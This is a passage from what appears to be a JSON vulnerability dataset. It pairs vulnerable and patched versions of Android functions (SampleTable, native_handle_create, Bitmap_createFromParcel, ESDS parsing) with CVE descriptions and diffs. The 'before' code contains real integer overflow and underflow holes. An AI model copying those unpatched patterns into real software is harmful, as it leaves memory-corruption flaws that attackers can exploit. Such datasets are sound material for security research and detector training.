        "func_before": "status_t SampleTable::setTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    if (mTimeToSample != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mTimeToSampleCount = U32_AT(&header[4]);\n    mTimeToSample = new uint32_t[mTimeToSampleCount * 2];\n\n    size_t size = sizeof(uint32_t) * mTimeToSampleCount * 2;\n    if (mDataSource->readAt(\n                data_offset + 8, mTimeToSample, size) < (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (uint32_t i = 0; i < mTimeToSampleCount * 2; ++i) {\n        mTimeToSample[i] = ntohl(mTimeToSample[i]);\n    }\n\n    return OK;\n}",
        "func": "status_t SampleTable::setTimeToSampleParams(\n        off64_t data_offset, size_t data_size) {\n    if (mTimeToSample != NULL || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mTimeToSampleCount = U32_AT(&header[4]);\n    uint64_t allocSize = mTimeToSampleCount * 2 * sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n    mTimeToSample = new uint32_t[mTimeToSampleCount * 2];\n\n    size_t size = sizeof(uint32_t) * mTimeToSampleCount * 2;\n    if (mDataSource->readAt(\n                data_offset + 8, mTimeToSample, size) < (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (uint32_t i = 0; i < mTimeToSampleCount * 2; ++i) {\n        mTimeToSample[i] = ntohl(mTimeToSample[i]);\n    }\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -16,6 +16,10 @@\n     }\n \n     mTimeToSampleCount = U32_AT(&header[4]);\n+    uint64_t allocSize = mTimeToSampleCount * 2 * sizeof(uint32_t);\n+    if (allocSize > SIZE_MAX) {\n+        return ERROR_OUT_OF_RANGE;\n+    }\n     mTimeToSample = new uint32_t[mTimeToSampleCount * 2];\n \n     size_t size = sizeof(uint32_t) * mTimeToSampleCount * 2;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    uint64_t allocSize = mTimeToSampleCount * 2 * sizeof(uint32_t);",
                "    if (allocSize > SIZE_MAX) {",
                "        return ERROR_OUT_OF_RANGE;",
                "    }"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-7915",
        "func_name": "android/SampleTable::setSyncSampleParams",
        "description": "Integer overflow in SampleTable.cpp in libstagefright in Android before 5.0.0 has unspecified impact and attack vectors, aka internal bug 15328708.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/edd4a76eb4747bd19ed122df46fa46b452c12a0d",
        "commit_title": "SampleTable: check integer overflow during table alloc",
        "commit_text": " Bug: 15328708 Bug: 15342615 Bug: 15342751 ",
        "func_before": "status_t SampleTable::setSyncSampleParams(off64_t data_offset, size_t data_size) {\n    if (mSyncSampleOffset >= 0 || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mSyncSampleOffset = data_offset;\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mNumSyncSamples = U32_AT(&header[4]);\n\n    if (mNumSyncSamples < 2) {\n        ALOGV(\"Table of sync samples is empty or has only a single entry!\");\n    }\n\n    mSyncSamples = new uint32_t[mNumSyncSamples];\n    size_t size = mNumSyncSamples * sizeof(uint32_t);\n    if (mDataSource->readAt(mSyncSampleOffset + 8, mSyncSamples, size)\n            != (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < mNumSyncSamples; ++i) {\n        mSyncSamples[i] = ntohl(mSyncSamples[i]) - 1;\n    }\n\n    return OK;\n}",
        "func": "status_t SampleTable::setSyncSampleParams(off64_t data_offset, size_t data_size) {\n    if (mSyncSampleOffset >= 0 || data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    mSyncSampleOffset = data_offset;\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mNumSyncSamples = U32_AT(&header[4]);\n\n    if (mNumSyncSamples < 2) {\n        ALOGV(\"Table of sync samples is empty or has only a single entry!\");\n    }\n\n    uint64_t allocSize = mNumSyncSamples * sizeof(uint32_t);\n    if (allocSize > SIZE_MAX) {\n        return ERROR_OUT_OF_RANGE;\n    }\n\n    mSyncSamples = new uint32_t[mNumSyncSamples];\n    size_t size = mNumSyncSamples * sizeof(uint32_t);\n    if (mDataSource->readAt(mSyncSampleOffset + 8, mSyncSamples, size)\n            != (ssize_t)size) {\n        return ERROR_IO;\n    }\n\n    for (size_t i = 0; i < mNumSyncSamples; ++i) {\n        mSyncSamples[i] = ntohl(mSyncSamples[i]) - 1;\n    }\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -22,6 +22,11 @@\n         ALOGV(\"Table of sync samples is empty or has only a single entry!\");\n     }\n \n+    uint64_t allocSize = mNumSyncSamples * sizeof(uint32_t);\n+    if (allocSize > SIZE_MAX) {\n+        return ERROR_OUT_OF_RANGE;\n+    }\n+\n     mSyncSamples = new uint32_t[mNumSyncSamples];\n     size_t size = mNumSyncSamples * sizeof(uint32_t);\n     if (mDataSource->readAt(mSyncSampleOffset + 8, mSyncSamples, size)",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    uint64_t allocSize = mNumSyncSamples * sizeof(uint32_t);",
                "    if (allocSize > SIZE_MAX) {",
                "        return ERROR_OUT_OF_RANGE;",
                "    }",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1528",
        "func_name": "android/native_handle_create",
        "description": "Integer overflow in the native_handle_create function in libcutils/native_handle.c in Android before 5.1.1 LMY48M allows attackers to obtain a different application's privileges or cause a denial of service (Binder heap memory corruption) via a crafted application, aka internal bug 19334482.",
        "git_url": "https://android.googlesource.com/platform/system/core/+/e8c62fb484151f76ab88b1d5130f38de24ac8c14",
        "commit_title": "Prevent integer overflow when allocating native_handle_t",
        "commit_text": " User specified values of numInts and numFds can overflow and cause malloc to allocate less than we expect, causing heap corruption in subsequent operations on the allocation.  Bug: 19334482 ",
        "func_before": "native_handle_t* native_handle_create(int numFds, int numInts)\n{\n    native_handle_t* h = malloc(\n            sizeof(native_handle_t) + sizeof(int)*(numFds+numInts));\n\n    if (h) {\n        h->version = sizeof(native_handle_t);\n        h->numFds = numFds;\n        h->numInts = numInts;\n    }\n    return h;\n}",
        "func": "native_handle_t* native_handle_create(int numFds, int numInts)\n{\n    if (numFds < 0 || numInts < 0 || numFds > kMaxNativeFds || numInts > kMaxNativeInts) {\n        return NULL;\n    }\n\n    size_t mallocSize = sizeof(native_handle_t) + (sizeof(int) * (numFds + numInts));\n    native_handle_t* h = malloc(mallocSize);\n    if (h) {\n        h->version = sizeof(native_handle_t);\n        h->numFds = numFds;\n        h->numInts = numInts;\n    }\n    return h;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,8 +1,11 @@\n native_handle_t* native_handle_create(int numFds, int numInts)\n {\n-    native_handle_t* h = malloc(\n-            sizeof(native_handle_t) + sizeof(int)*(numFds+numInts));\n+    if (numFds < 0 || numInts < 0 || numFds > kMaxNativeFds || numInts > kMaxNativeInts) {\n+        return NULL;\n+    }\n \n+    size_t mallocSize = sizeof(native_handle_t) + (sizeof(int) * (numFds + numInts));\n+    native_handle_t* h = malloc(mallocSize);\n     if (h) {\n         h->version = sizeof(native_handle_t);\n         h->numFds = numFds;",
        "diff_line_info": {
            "deleted_lines": [
                "    native_handle_t* h = malloc(",
                "            sizeof(native_handle_t) + sizeof(int)*(numFds+numInts));"
            ],
            "added_lines": [
                "    if (numFds < 0 || numInts < 0 || numFds > kMaxNativeFds || numInts > kMaxNativeInts) {",
                "        return NULL;",
                "    }",
                "    size_t mallocSize = sizeof(native_handle_t) + (sizeof(int) * (numFds + numInts));",
                "    native_handle_t* h = malloc(mallocSize);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1528",
        "func_name": "android/Parcel::readNativeHandle",
        "description": "Integer overflow in the native_handle_create function in libcutils/native_handle.c in Android before 5.1.1 LMY48M allows attackers to obtain a different application's privileges or cause a denial of service (Binder heap memory corruption) via a crafted application, aka internal bug 19334482.",
        "git_url": "https://android.googlesource.com/platform/frameworks/native/+/7dcd0ec9c91688cfa3f679804ba6e132f9811254",
        "commit_title": "Verify that the native handle was created",
        "commit_text": " The inputs to native_handle_create can cause an overflowed allocation, so check the return value of native_handle_create before accessing the memory it returns.  Bug:19334482 (cherry picked from commit eaac99a7172da52a76ba48c26413778a74951b1a) ",
        "func_before": "native_handle* Parcel::readNativeHandle() const\n{\n    int numFds, numInts;\n    status_t err;\n    err = readInt32(&numFds);\n    if (err != NO_ERROR) return 0;\n    err = readInt32(&numInts);\n    if (err != NO_ERROR) return 0;\n\n    native_handle* h = native_handle_create(numFds, numInts);\n    for (int i=0 ; err==NO_ERROR && i<numFds ; i++) {\n        h->data[i] = dup(readFileDescriptor());\n        if (h->data[i] < 0) err = BAD_VALUE;\n    }\n    err = read(h->data + numFds, sizeof(int)*numInts);\n    if (err != NO_ERROR) {\n        native_handle_close(h);\n        native_handle_delete(h);\n        h = 0;\n    }\n    return h;\n}",
        "func": "native_handle* Parcel::readNativeHandle() const\n{\n    int numFds, numInts;\n    status_t err;\n    err = readInt32(&numFds);\n    if (err != NO_ERROR) return 0;\n    err = readInt32(&numInts);\n    if (err != NO_ERROR) return 0;\n\n    native_handle* h = native_handle_create(numFds, numInts);\n    if (!h) {\n        return 0;\n    }\n\n    for (int i=0 ; err==NO_ERROR && i<numFds ; i++) {\n        h->data[i] = dup(readFileDescriptor());\n        if (h->data[i] < 0) err = BAD_VALUE;\n    }\n    err = read(h->data + numFds, sizeof(int)*numInts);\n    if (err != NO_ERROR) {\n        native_handle_close(h);\n        native_handle_delete(h);\n        h = 0;\n    }\n    return h;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,6 +8,10 @@\n     if (err != NO_ERROR) return 0;\n \n     native_handle* h = native_handle_create(numFds, numInts);\n+    if (!h) {\n+        return 0;\n+    }\n+\n     for (int i=0 ; err==NO_ERROR && i<numFds ; i++) {\n         h->data[i] = dup(readFileDescriptor());\n         if (h->data[i] < 0) err = BAD_VALUE;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    if (!h) {",
                "        return 0;",
                "    }",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1536",
        "func_name": "android/Bitmap_createFromParcel",
        "description": "Integer overflow in the Bitmap_createFromParcel function in core/jni/android/graphics/Bitmap.cpp in Android before 5.1.1 LMY48I allows attackers to cause a denial of service (system_server crash) or obtain sensitive system_server memory-content information via a crafted application that leverages improper unmarshalling of bitmaps, aka internal bug 19666945.",
        "git_url": "https://android.googlesource.com/platform/frameworks/base/+/d44e5bde18a41beda39d49189bef7f2ba7c8f3cb",
        "commit_title": "Make Bitmap_createFromParcel check the color count. DO NOT MERGE",
        "commit_text": " When reading from the parcel, if the number of colors is invalid, early exit.  Add two more checks: setInfo must return true, and Parcel::readInplace must return non-NULL. The former ensures that the previously read values (width, height, etc) were valid, and the latter checks that the Parcel had enough data even if the number of colors was reasonable.  Also use an auto-deleter to handle deletion of the SkBitmap.  Cherry pick from change-Id: Icbd562d6d1f131a723724883fd31822d337cf5a6   ",
        "func_before": "static jobject Bitmap_createFromParcel(JNIEnv* env, jobject, jobject parcel) {\n    if (parcel == NULL) {\n        SkDebugf(\"-------- unparcel parcel is NULL\\n\");\n        return NULL;\n    }\n\n    android::Parcel* p = android::parcelForJavaObject(env, parcel);\n\n    const bool        isMutable = p->readInt32() != 0;\n    const SkColorType colorType = (SkColorType)p->readInt32();\n    const SkAlphaType alphaType = (SkAlphaType)p->readInt32();\n    const int         width = p->readInt32();\n    const int         height = p->readInt32();\n    const int         rowBytes = p->readInt32();\n    const int         density = p->readInt32();\n\n    if (kN32_SkColorType != colorType &&\n            kRGB_565_SkColorType != colorType &&\n            kARGB_4444_SkColorType != colorType &&\n            kIndex_8_SkColorType != colorType &&\n            kAlpha_8_SkColorType != colorType) {\n        SkDebugf(\"Bitmap_createFromParcel unknown colortype: %d\\n\", colorType);\n        return NULL;\n    }\n\n    SkBitmap* bitmap = new SkBitmap;\n\n    bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes);\n\n    SkColorTable* ctable = NULL;\n    if (colorType == kIndex_8_SkColorType) {\n        int count = p->readInt32();\n        if (count > 0) {\n            size_t size = count * sizeof(SkPMColor);\n            const SkPMColor* src = (const SkPMColor*)p->readInplace(size);\n            ctable = new SkColorTable(src, count);\n        }\n    }\n\n    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap, ctable);\n    if (NULL == buffer) {\n        SkSafeUnref(ctable);\n        delete bitmap;\n        return NULL;\n    }\n\n    SkSafeUnref(ctable);\n\n    size_t size = bitmap->getSize();\n\n    android::Parcel::ReadableBlob blob;\n    android::status_t status = p->readBlob(size, &blob);\n    if (status) {\n        doThrowRE(env, \"Could not read bitmap from parcel blob.\");\n        delete bitmap;\n        return NULL;\n    }\n\n    bitmap->lockPixels();\n    memcpy(bitmap->getPixels(), blob.data(), size);\n    bitmap->unlockPixels();\n\n    blob.release();\n\n    return GraphicsJNI::createBitmap(env, bitmap, buffer, getPremulBitmapCreateFlags(isMutable),\n            NULL, NULL, density);\n}",
        "func": "static jobject Bitmap_createFromParcel(JNIEnv* env, jobject, jobject parcel) {\n    if (parcel == NULL) {\n        SkDebugf(\"-------- unparcel parcel is NULL\\n\");\n        return NULL;\n    }\n\n    android::Parcel* p = android::parcelForJavaObject(env, parcel);\n\n    const bool        isMutable = p->readInt32() != 0;\n    const SkColorType colorType = (SkColorType)p->readInt32();\n    const SkAlphaType alphaType = (SkAlphaType)p->readInt32();\n    const int         width = p->readInt32();\n    const int         height = p->readInt32();\n    const int         rowBytes = p->readInt32();\n    const int         density = p->readInt32();\n\n    if (kN32_SkColorType != colorType &&\n            kRGB_565_SkColorType != colorType &&\n            kARGB_4444_SkColorType != colorType &&\n            kIndex_8_SkColorType != colorType &&\n            kAlpha_8_SkColorType != colorType) {\n        SkDebugf(\"Bitmap_createFromParcel unknown colortype: %d\\n\", colorType);\n        return NULL;\n    }\n\n    SkAutoTDelete<SkBitmap> bitmap(new SkBitmap);\n\n    if (!bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes)) {\n        return NULL;\n    }\n\n    SkColorTable* ctable = NULL;\n    if (colorType == kIndex_8_SkColorType) {\n        int count = p->readInt32();\n        if (count < 0 || count > 256) {\n            // The data is corrupt, since SkColorTable enforces a value between 0 and 256,\n            // inclusive.\n            return NULL;\n        }\n        if (count > 0) {\n            size_t size = count * sizeof(SkPMColor);\n            const SkPMColor* src = (const SkPMColor*)p->readInplace(size);\n            if (src == NULL) {\n                return NULL;\n            }\n            ctable = new SkColorTable(src, count);\n        }\n    }\n\n    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap.get(), ctable);\n    if (NULL == buffer) {\n        SkSafeUnref(ctable);\n        return NULL;\n    }\n\n    SkSafeUnref(ctable);\n\n    size_t size = bitmap->getSize();\n\n    android::Parcel::ReadableBlob blob;\n    android::status_t status = p->readBlob(size, &blob);\n    if (status) {\n        doThrowRE(env, \"Could not read bitmap from parcel blob.\");\n        return NULL;\n    }\n\n    bitmap->lockPixels();\n    memcpy(bitmap->getPixels(), blob.data(), size);\n    bitmap->unlockPixels();\n\n    blob.release();\n\n    return GraphicsJNI::createBitmap(env, bitmap.detach(), buffer,\n            getPremulBitmapCreateFlags(isMutable), NULL, NULL, density);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -23,24 +23,33 @@\n         return NULL;\n     }\n \n-    SkBitmap* bitmap = new SkBitmap;\n+    SkAutoTDelete<SkBitmap> bitmap(new SkBitmap);\n \n-    bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes);\n+    if (!bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes)) {\n+        return NULL;\n+    }\n \n     SkColorTable* ctable = NULL;\n     if (colorType == kIndex_8_SkColorType) {\n         int count = p->readInt32();\n+        if (count < 0 || count > 256) {\n+            // The data is corrupt, since SkColorTable enforces a value between 0 and 256,\n+            // inclusive.\n+            return NULL;\n+        }\n         if (count > 0) {\n             size_t size = count * sizeof(SkPMColor);\n             const SkPMColor* src = (const SkPMColor*)p->readInplace(size);\n+            if (src == NULL) {\n+                return NULL;\n+            }\n             ctable = new SkColorTable(src, count);\n         }\n     }\n \n-    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap, ctable);\n+    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap.get(), ctable);\n     if (NULL == buffer) {\n         SkSafeUnref(ctable);\n-        delete bitmap;\n         return NULL;\n     }\n \n@@ -52,7 +61,6 @@\n     android::status_t status = p->readBlob(size, &blob);\n     if (status) {\n         doThrowRE(env, \"Could not read bitmap from parcel blob.\");\n-        delete bitmap;\n         return NULL;\n     }\n \n@@ -62,6 +70,6 @@\n \n     blob.release();\n \n-    return GraphicsJNI::createBitmap(env, bitmap, buffer, getPremulBitmapCreateFlags(isMutable),\n-            NULL, NULL, density);\n+    return GraphicsJNI::createBitmap(env, bitmap.detach(), buffer,\n+            getPremulBitmapCreateFlags(isMutable), NULL, NULL, density);\n }",
        "diff_line_info": {
            "deleted_lines": [
                "    SkBitmap* bitmap = new SkBitmap;",
                "    bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes);",
                "    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap, ctable);",
                "        delete bitmap;",
                "        delete bitmap;",
                "    return GraphicsJNI::createBitmap(env, bitmap, buffer, getPremulBitmapCreateFlags(isMutable),",
                "            NULL, NULL, density);"
            ],
            "added_lines": [
                "    SkAutoTDelete<SkBitmap> bitmap(new SkBitmap);",
                "    if (!bitmap->setInfo(SkImageInfo::Make(width, height, colorType, alphaType), rowBytes)) {",
                "        return NULL;",
                "    }",
                "        if (count < 0 || count > 256) {",
                "            // The data is corrupt, since SkColorTable enforces a value between 0 and 256,",
                "            // inclusive.",
                "            return NULL;",
                "        }",
                "            if (src == NULL) {",
                "                return NULL;",
                "            }",
                "    jbyteArray buffer = GraphicsJNI::allocateJavaPixelRef(env, bitmap.get(), ctable);",
                "    return GraphicsJNI::createBitmap(env, bitmap.detach(), buffer,",
                "            getPremulBitmapCreateFlags(isMutable), NULL, NULL, density);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1538",
        "func_name": "android/SampleTable::setSampleToChunkParams",
        "description": "Integer overflow in the SampleTable::setSampleToChunkParams function in SampleTable.cpp in libstagefright in Android before 5.1.1 LMY48I allows remote attackers to execute arbitrary code via crafted atoms in MP4 data that trigger an unchecked multiplication, aka internal bug 20139950, a related issue to CVE-2015-4496.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/2434839bbd168469f80dd9a22f1328bc81046398",
        "commit_title": "Fix integer overflow during MP4 atom processing",
        "commit_text": " A few sample table related FourCC values are handled by the setSampleToChunkParams function. An integer overflow exists within this function. Validate that mNumSampleToChunkOffets will not cause an integer overflow.  Bug: 20139950  (cherry picked from commit c24607c29c96f939aed9e33bfa702b1dd79da4b7)  ",
        "func_before": "status_t SampleTable::setSampleToChunkParams(\n        off64_t data_offset, size_t data_size) {\n    if (mSampleToChunkOffset >= 0) {\n        return ERROR_MALFORMED;\n    }\n\n    mSampleToChunkOffset = data_offset;\n\n    if (data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mNumSampleToChunkOffsets = U32_AT(&header[4]);\n\n    if (data_size < 8 + mNumSampleToChunkOffsets * 12) {\n        return ERROR_MALFORMED;\n    }\n\n    mSampleToChunkEntries =\n        new SampleToChunkEntry[mNumSampleToChunkOffsets];\n\n    for (uint32_t i = 0; i < mNumSampleToChunkOffsets; ++i) {\n        uint8_t buffer[12];\n        if (mDataSource->readAt(\n                    mSampleToChunkOffset + 8 + i * 12, buffer, sizeof(buffer))\n                != (ssize_t)sizeof(buffer)) {\n            return ERROR_IO;\n        }\n\n        CHECK(U32_AT(buffer) >= 1);  // chunk index is 1 based in the spec.\n\n        // We want the chunk index to be 0-based.\n        mSampleToChunkEntries[i].startChunk = U32_AT(buffer) - 1;\n        mSampleToChunkEntries[i].samplesPerChunk = U32_AT(&buffer[4]);\n        mSampleToChunkEntries[i].chunkDesc = U32_AT(&buffer[8]);\n    }\n\n    return OK;\n}",
        "func": "status_t SampleTable::setSampleToChunkParams(\n        off64_t data_offset, size_t data_size) {\n    if (mSampleToChunkOffset >= 0) {\n        return ERROR_MALFORMED;\n    }\n\n    mSampleToChunkOffset = data_offset;\n\n    if (data_size < 8) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t header[8];\n    if (mDataSource->readAt(\n                data_offset, header, sizeof(header)) < (ssize_t)sizeof(header)) {\n        return ERROR_IO;\n    }\n\n    if (U32_AT(header) != 0) {\n        // Expected version = 0, flags = 0.\n        return ERROR_MALFORMED;\n    }\n\n    mNumSampleToChunkOffsets = U32_AT(&header[4]);\n\n    if (data_size < 8 + mNumSampleToChunkOffsets * 12) {\n        return ERROR_MALFORMED;\n    }\n\n    if (SIZE_MAX / sizeof(SampleToChunkEntry) <= mNumSampleToChunkOffsets)\n        return ERROR_OUT_OF_RANGE;\n\n    mSampleToChunkEntries =\n        new SampleToChunkEntry[mNumSampleToChunkOffsets];\n\n    for (uint32_t i = 0; i < mNumSampleToChunkOffsets; ++i) {\n        uint8_t buffer[12];\n        if (mDataSource->readAt(\n                    mSampleToChunkOffset + 8 + i * 12, buffer, sizeof(buffer))\n                != (ssize_t)sizeof(buffer)) {\n            return ERROR_IO;\n        }\n\n        CHECK(U32_AT(buffer) >= 1);  // chunk index is 1 based in the spec.\n\n        // We want the chunk index to be 0-based.\n        mSampleToChunkEntries[i].startChunk = U32_AT(buffer) - 1;\n        mSampleToChunkEntries[i].samplesPerChunk = U32_AT(&buffer[4]);\n        mSampleToChunkEntries[i].chunkDesc = U32_AT(&buffer[8]);\n    }\n\n    return OK;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -27,6 +27,9 @@\n         return ERROR_MALFORMED;\n     }\n \n+    if (SIZE_MAX / sizeof(SampleToChunkEntry) <= mNumSampleToChunkOffsets)\n+        return ERROR_OUT_OF_RANGE;\n+\n     mSampleToChunkEntries =\n         new SampleToChunkEntry[mNumSampleToChunkOffsets];\n ",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    if (SIZE_MAX / sizeof(SampleToChunkEntry) <= mNumSampleToChunkOffsets)",
                "        return ERROR_OUT_OF_RANGE;",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2015-1539",
        "func_name": "android/ESDS::parseESDescriptor",
        "description": "Multiple integer underflows in the ESDS::parseESDescriptor function in ESDS.cpp in libstagefright in Android before 5.1.1 LMY48I allow remote attackers to execute arbitrary code via crafted ESDS atoms, aka internal bug 20139950, a related issue to CVE-2015-4493.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/5e751957ba692658b7f67eb03ae5ddb2cd3d970c",
        "commit_title": "Fix integer underflow in ESDS processing",
        "commit_text": " Several arithmetic operations within parseESDescriptor could underflow, leading to an out-of-bounds read operation. Ensure that subtractions from 'size' do not cause it to wrap around.  Bug: 20139950  (cherry picked from commit 07c0f59d6c48874982d2b5c713487612e5af465a)  ",
        "func_before": "status_t ESDS::parseESDescriptor(size_t offset, size_t size) {\n    if (size < 3) {\n        return ERROR_MALFORMED;\n    }\n\n    offset += 2;  // skip ES_ID\n    size -= 2;\n\n    unsigned streamDependenceFlag = mData[offset] & 0x80;\n    unsigned URL_Flag = mData[offset] & 0x40;\n    unsigned OCRstreamFlag = mData[offset] & 0x20;\n\n    ++offset;\n    --size;\n\n    if (streamDependenceFlag) {\n        offset += 2;\n        size -= 2;\n    }\n\n    if (URL_Flag) {\n        if (offset >= size) {\n            return ERROR_MALFORMED;\n        }\n        unsigned URLlength = mData[offset];\n        offset += URLlength + 1;\n        size -= URLlength + 1;\n    }\n\n    if (OCRstreamFlag) {\n        offset += 2;\n        size -= 2;\n\n        if ((offset >= size || mData[offset] != kTag_DecoderConfigDescriptor)\n                && offset - 2 < size\n                && mData[offset - 2] == kTag_DecoderConfigDescriptor) {\n            // Content found \"in the wild\" had OCRstreamFlag set but was\n            // missing OCR_ES_Id, the decoder config descriptor immediately\n            // followed instead.\n            offset -= 2;\n            size += 2;\n\n            ALOGW(\"Found malformed 'esds' atom, ignoring missing OCR_ES_Id.\");\n        }\n    }\n\n    if (offset >= size) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t tag;\n    size_t sub_offset, sub_size;\n    status_t err = skipDescriptorHeader(\n            offset, size, &tag, &sub_offset, &sub_size);\n\n    if (err != OK) {\n        return err;\n    }\n\n    if (tag != kTag_DecoderConfigDescriptor) {\n        return ERROR_MALFORMED;\n    }\n\n    err = parseDecoderConfigDescriptor(sub_offset, sub_size);\n\n    return err;\n}",
        "func": "status_t ESDS::parseESDescriptor(size_t offset, size_t size) {\n    if (size < 3) {\n        return ERROR_MALFORMED;\n    }\n\n    offset += 2;  // skip ES_ID\n    size -= 2;\n\n    unsigned streamDependenceFlag = mData[offset] & 0x80;\n    unsigned URL_Flag = mData[offset] & 0x40;\n    unsigned OCRstreamFlag = mData[offset] & 0x20;\n\n    ++offset;\n    --size;\n\n    if (streamDependenceFlag) {\n        if (size < 2)\n            return ERROR_MALFORMED;\n        offset += 2;\n        size -= 2;\n    }\n\n    if (URL_Flag) {\n        if (offset >= size) {\n            return ERROR_MALFORMED;\n        }\n        unsigned URLlength = mData[offset];\n        if (URLlength >= size)\n            return ERROR_MALFORMED;\n        offset += URLlength + 1;\n        size -= URLlength + 1;\n    }\n\n    if (OCRstreamFlag) {\n        if (size < 2)\n            return ERROR_MALFORMED;\n        offset += 2;\n        size -= 2;\n\n        if ((offset >= size || mData[offset] != kTag_DecoderConfigDescriptor)\n                && offset - 2 < size\n                && mData[offset - 2] == kTag_DecoderConfigDescriptor) {\n            // Content found \"in the wild\" had OCRstreamFlag set but was\n            // missing OCR_ES_Id, the decoder config descriptor immediately\n            // followed instead.\n            offset -= 2;\n            size += 2;\n\n            ALOGW(\"Found malformed 'esds' atom, ignoring missing OCR_ES_Id.\");\n        }\n    }\n\n    if (offset >= size) {\n        return ERROR_MALFORMED;\n    }\n\n    uint8_t tag;\n    size_t sub_offset, sub_size;\n    status_t err = skipDescriptorHeader(\n            offset, size, &tag, &sub_offset, &sub_size);\n\n    if (err != OK) {\n        return err;\n    }\n\n    if (tag != kTag_DecoderConfigDescriptor) {\n        return ERROR_MALFORMED;\n    }\n\n    err = parseDecoderConfigDescriptor(sub_offset, sub_size);\n\n    return err;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,6 +14,8 @@\n     --size;\n \n     if (streamDependenceFlag) {\n+        if (size < 2)\n+            return ERROR_MALFORMED;\n         offset += 2;\n         size -= 2;\n     }\n@@ -23,11 +25,15 @@\n             return ERROR_MALFORMED;\n         }\n         unsigned URLlength = mData[offset];\n+        if (URLlength >= size)\n+            return ERROR_MALFORMED;\n         offset += URLlength + 1;\n         size -= URLlength + 1;\n     }\n \n     if (OCRstreamFlag) {\n+        if (size < 2)\n+            return ERROR_MALFORMED;\n         offset += 2;\n         size -= 2;\n ",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "        if (size < 2)",
                "            return ERROR_MALFORMED;",
                "        if (URLlength >= size)",
                "            return ERROR_MALFORMED;",
                "        if (size < 2)",
                "            return ERROR_MALFORMED;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-3826",
        "func_name": "android/MPEG4Extractor::parse3GPPMetaData",
        "description": "The MPEG4Extractor::parse3GPPMetaData function in MPEG4Extractor.cpp in libstagefright in Android before 5.1.1 LMY48I does not enforce a minimum size for UTF-16 strings containing a Byte Order Mark (BOM), which allows remote attackers to cause a denial of service (integer underflow, buffer over-read, and mediaserver process crash) via crafted 3GPP metadata, aka internal bug 20923261, a related issue to CVE-2015-3828.",
        "git_url": "https://android.googlesource.com/platform/frameworks/av/+/f4f7e0c102819f039ebb1972b3dba1d3186bc1d1",
        "commit_title": "Prevent integer underflow if size is below 6",
